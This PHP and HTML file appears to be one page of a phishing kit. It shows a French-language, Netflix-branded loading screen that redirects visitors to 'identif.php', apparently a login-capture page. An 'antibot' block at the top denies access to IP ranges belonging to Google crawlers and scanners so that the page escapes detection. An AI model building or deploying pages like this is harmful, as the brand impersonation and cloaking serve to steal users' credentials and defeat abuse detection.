<?php
// Antibot protection
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// List of blocked IPs (simplified version from previous antibot configuration)
$blocked_ips = array(
    '/^64\..*/', '/^66\.102\..*/', '/^66\.249\..*/', '/^72\.14\..*/',
    '/^74\.125\..*/', '/^209\.85\..*/', '/^216\.239\..*/'
);

// Check if IP is blocked
foreach ($blocked_ips as $blocked_ip) {
    if (preg_match($blocked_ip, $ip)) {
        header('HTTP/1.0 403 Forbidden');
        exit('Access denied.');
    }
}


?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chargement...</title>
    <link rel="stylesheet" >
    <style>
        /* Style pour centrer l'animation */
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image:url(netflix.jpg);
        }

        /* Conteneur de chargement */
        .loader-container {
            text-align: center;
            color: #fff;
        }

        /* Animation Netflix (cercles rotatifs) */
        .loader {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
        }
        .loader div {
            position: absolute;
            border: 4px solid #e50914;
            opacity: 1;
            border-radius: 50%;
            animation: loader-animation 1s cubic-bezier(0, 0.2, 0.8, 1) infinite;
        }
        .loader div:nth-child(2) {
            animation-delay: -0.5s;
        }
        @keyframes loader-animation {
            0% {
                top: 36px;
                left: 36px;
                width: 0;
                height: 0;
                opacity: 1;
            }
            100% {
                top: 0px;
                left: 0px;
                width: 72px;
                height: 72px;
                opacity: 0;
            }
        }

        /* Style du texte */
        .loading-text {
            margin-top: 20px;
            font-size: 1.2em;
            font-family: 'Arial', sans-serif;
        }
    </style>
    <script>
        // Redirection après 6 secondes avec le paramètre "from=loading"
        setTimeout(function(){
            window.location.href = 'identif.php';
        }, 10000);
    </script>
</head>
<body>
    <div class="loader-container">
        <div class="loader">
            <div></div>
            <div></div>
        </div>
        <p class="loading-text">Chargement en cours...</p>
    </div>
</body>
</html>
